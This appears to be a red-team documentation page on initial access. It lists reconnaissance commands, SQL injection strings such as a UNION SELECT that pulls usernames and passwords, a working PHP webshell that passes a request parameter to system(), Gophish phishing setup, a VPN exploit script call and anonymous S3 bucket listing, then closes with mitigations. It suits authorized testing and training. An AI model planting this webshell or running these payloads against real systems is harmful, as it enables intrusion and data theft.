---
title: Initial Access Techniques
description: Methods for obtaining initial entry into target environments
---

# Initial Access Techniques

Initial access represents the first phase of an attack, where the operator attempts to gain a foothold in the target environment. This section covers various techniques for obtaining initial access during authorized red team operations.

## External Reconnaissance

Before attempting access, thorough reconnaissance is essential:

- **OSINT**: Gathering publicly available information
- **Network scanning**: Identifying exposed services and potential entry points
- **Subdomain enumeration**: Discovering forgotten or unmanaged assets

### OSINT Tools

```bash
# Example reconnaissance workflow
whois target.com
theHarvester -d target.com -b google,linkedin
amass enum -d target.com
subfinder -d target.com
```

## Web Application Attacks

Web applications often provide the path of least resistance for initial access:

### SQL Injection

SQL injection remains a critical vulnerability in many web applications:

```sql
-- Basic SQL injection test
' OR 1=1 --
' UNION SELECT username, password FROM users --
```

### File Upload Vulnerabilities

Unrestricted file uploads can lead to remote code execution:

```php
<?php
  // Basic PHP webshell
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
  }
?>
```

## Phishing Campaigns

Phishing remains one of the most effective initial access techniques:

1. **Reconnaissance**: Gather information about targets
2. **Infrastructure**: Set up domains, email services, and collection mechanisms
3. **Lure creation**: Develop convincing scenarios and content
4. **Execution**: Deliver the campaign
5. **Post-exploitation**: Establish persistence once access is obtained

### Example Phishing Framework Setup

```bash
# Setting up Gophish
docker pull gophish/gophish
docker run -d -p 3333:3333 -p 8080:8080 --name gophish gophish/gophish
```

## External Service Exploitation

Targeting externally exposed services can provide direct access:

### VPN and Remote Access

VPN services and remote access solutions often become targets:

```bash
# Example Pulse Secure VPN scanner
./pulse-exploit.sh -u https://vpn.target.com --check
```

### Cloud Misconfigurations

Cloud resources with misconfigurations can provide initial access vectors:

```bash
# S3 bucket enumeration
aws s3 ls s3://company-backup-bucket/ --no-sign-request
```

## Mitigation Strategies

Organizations can protect against these attack vectors by:

- Implementing robust patch management
- Conducting regular security awareness training
- Deploying multi-factor authentication
- Performing regular external penetration testing
- Using cloud security posture management tools

## References

- [MITRE ATT&CK - Initial Access](https://attack.mitre.org/tactics/TA0001/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)